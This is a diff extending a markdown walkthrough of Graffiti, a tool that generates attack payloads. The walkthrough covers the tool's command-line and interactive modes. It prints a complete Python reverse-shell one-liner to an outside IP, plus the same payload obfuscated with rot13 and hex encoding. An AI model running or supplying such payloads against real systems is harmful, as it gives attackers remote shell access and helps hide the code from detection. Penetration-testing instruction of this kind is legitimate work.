@@ -67,3 +67,74 @@ root@e1800918:~/cyebr/Graffiti# graffiti -p /linux/python/socket_reverse.json -c
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.0.9.18",1800918));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ```
+
+That will spit out the command for the appropriate reverse shell with all the information filled in.
+
+Let's seek a different example. but encoded in rot13:
+
+```bash
+
+root@e1800918:~/cyebr/Graffiti# graffiti -p /linux/python/socket_reverse.json -c rot13 -lH 18.0.9.18 -lP 1800918
+python -c 'exec("vzcbeg fbpxrg,fhocebprff,bf;f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ);f.pbaarpg((\"18.0.9.18\",1800918));bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2);c=fhocebprff.pnyy([\"/ova/fu\",\"-v\"]);".decode("rot13"))'
+
+```
+
+Another one with hex:
+
+```bash
+
+root@e1800918:~/cyebr/Graffiti# graffiti -p /linux/python/socket_reverse.json -c hex -lH 18.0.9.18 -lP 1800918
+python -c 'exec("696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e65637428282231382e302e392e3138222c3138303039313829293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b".decode("hex"))'
+
+```
+
+Graffiti keeps a cache of payloads like a history for easy access, don't need to run those commands above again. Use the `-vC` option to see them:
+
+![e1800918](pic/6.PNG)
+
+We can also clear the history with the `-W` command:
+
+![e1800918](pic/7.PNG)
+
+# The other way to run Graffiti is in its interactive mode, which comes with a built-in terminal environment. There are more commands and clearly informations.
+
+First of all, just type in `graffiti`:
+
+```bash
+
+root@e1800918:~/cyebr/Graffiti# graffiti
+
+  ________              _____  _____.__  __  .__
+ /  _____/___________ _/ ____\/ ____\__|/  |_|__|
+/   \  __\_  __ \__  \\   __\\   __\|  \   __\  |
+\    \_\  \  | \// __ \|  |   |  |  |  ||  | |  |
+ \______  /__|  (____  /__|   |__|  |__||__| |__|
+        \/           \/
+ v(0.0.10)
+
+no arguments have been passed, dropping into terminal type `help/?` to get help, all commands that sit inside of `/bin` are available in the terminal
+root@graffiti:~/graffiti#
+
+```
+
+Let's take a look at the help menu, type `help` or `?` :
+
+![e1800918](pic/8.PNG)
+
+We can check if we have the up-to-date version of the graffiti by `check` command:
+
+![e1800918](pic/9.PNG)
+
+We can get Linux kernel version and some other system information with the `uname -a` command in Linux.
+
+![e1800918](pic/10.PNG)
+
+The `list` command will show all the available payloads but not clearly allocated like the `-l` switch from the normal command-line mode:
+
+![e1800918](pic/11.PNG)
+
+
+
+
+
+
